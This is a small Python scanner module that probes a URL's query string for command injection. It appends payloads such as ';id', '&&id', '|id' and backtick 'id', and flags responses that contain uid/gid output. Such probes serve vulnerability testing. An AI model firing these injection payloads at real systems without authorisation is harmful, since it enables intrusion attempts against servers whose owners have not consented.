#!/usr/bin/env python3
import aiohttp
import asyncio
import os
import hashlib

# Simple destructive RCE/command injection check
async def rce_check(url: str, outdir: str):
    """
    Attempt command injection via query parameters.
    Returns a list of findings.
    """
    findings = []
    test_payloads = [";id", "&&id", "|id", "`id`"]
    rce_markers = ["uid=", "gid=", "groups="]

    try:
        async with aiohttp.ClientSession() as session:
            for payload in test_payloads:
                if "?" not in url:
                    continue
                base, q = url.split("?", 1)
                injected_url = url + payload
                try:
                    async with session.get(injected_url, timeout=10) as resp:
                        text = await resp.text()
                        if any(marker in text for marker in rce_markers):
                            fid = hashlib.md5(injected_url.encode()).hexdigest()
                            finding = {
                                "id": fid,
                                "type": "rce-command-injection",
                                "target": injected_url,
                                "severity": 5,
                                "evidence": "Command injection output detected",
                                "payload": payload,
                                "response_snippet": text[:300],
                                "destructive": True,
                            }
                            findings.append(finding)
                            # break after first hit
                            break
                except Exception as e:
                    continue
    except Exception as e:
        pass

    return findings


# Quick standalone test
if __name__ == "__main__":
    import sys
    async def main():
        if len(sys.argv) < 2:
            print("Usage: python3 rce.py <url>")
            return
        res = await rce_check(sys.argv[1], ".")
        print(res)
    asyncio.run(main())
